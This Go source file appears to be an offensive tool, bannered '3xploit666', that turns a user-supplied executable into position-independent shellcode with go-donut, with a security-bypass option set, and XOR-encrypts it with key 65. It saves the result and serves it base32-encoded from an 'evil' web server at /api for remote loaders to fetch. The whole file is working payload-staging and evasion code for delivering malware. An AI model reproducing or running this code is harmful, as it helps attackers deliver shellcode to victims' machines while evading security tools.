package main

import (
	"bufio"
	"encoding/base32"
	"fmt"
	"github.com/Binject/go-donut/donut"
	"github.com/fatih/color"
	"github.com/labstack/echo/v4"
	"github.com/labstack/echo/v4/middleware"
	"io/ioutil"
	"log"
	"net/http"
	"os"
)

func xor(buf []byte, xorchar byte) []byte {
	res := make([]byte, len(buf))
	for i := 0; i < len(buf); i++ {
		res[i] = xorchar ^ buf[i]

	}
	return res
}






var Banner = `

      ██████                ██████      
      ██▒▒████████    ████████▒▒██      
    ██████████▒▒██    ██▒▒██████████    
    ██▒▒▒▒████▒▒████████▒▒████▒▒▒▒██    
██████▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒██████
██▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▒▒██
██▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒██
██▒▒████▒▒▒▒████▒▒▒▒▒▒▒▒████▒▒▒▒████▒▒██
██▒▒████▒▒▒▒████▒▒▒▒▒▒▒▒████▒▒▒▒████▒▒██
████▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒████
  ██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████  
      ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██      
      ██████▒▒▒▒████████▒▒▒▒██████      
          ██▒▒▒▒██    ██▒▒▒▒██          
      ████████████    ████████████      
      ██▒▒██                ██▒▒██      
      ██████                ██████      

3xploit666

`


func main() {
        color.Yellow(Banner)
	evil := echo.New()

	// logger de formato segun las variables indicadas
	evil.Use(middleware.LoggerWithConfig(middleware.LoggerConfig{
		Format: "time=${time_rfc3339}, method=${method}, uri=${uri},Ip=${remote_ip}, status=${status}\n",
	}))

	fmt.Print("inserte el binario (payload): ")
	scan := bufio.NewScanner(os.Stdin)

	// nuestro binario queda almacenado en el scan
	scan.Scan()
	config := new(donut.DonutConfig)
	config.Arch = donut.X64
	config.Entropy = donut.DONUT_ENTROPY_DEFAULT
	config.InstType = donut.DONUT_INSTANCE_PIC
	config.Type = donut.DONUT_MODULE_EXE
	config.Bypass = 3
	config.Format = 1
	config.Compress = 1

	payload, err := donut.ShellcodeFromFile(scan.Text(), config)

	if err != nil {
		log.Println(err)
	}

	readBuffer, _ := ioutil.ReadAll(payload)

	cifrar := xor(readBuffer, 65)

	color.Yellow("cifrando payload key : 65 ")

	ioutil.WriteFile("encrypted.bin", cifrar, 0644)
	color.Yellow("binario generado exitosamente [+] ")
	evil.GET("/api", func(c echo.Context) error {
		return c.String(http.StatusOK, base32.StdEncoding.EncodeToString(cifrar))
	})
	fmt.Println("inserte el puerto :")
	scan2 := bufio.NewScanner(os.Stdin)
	scan2.Scan()
	color.Yellow("Evil server on [+]")
	go evil.Logger.Fatal(evil.Start(":" + scan2.Text()))

}
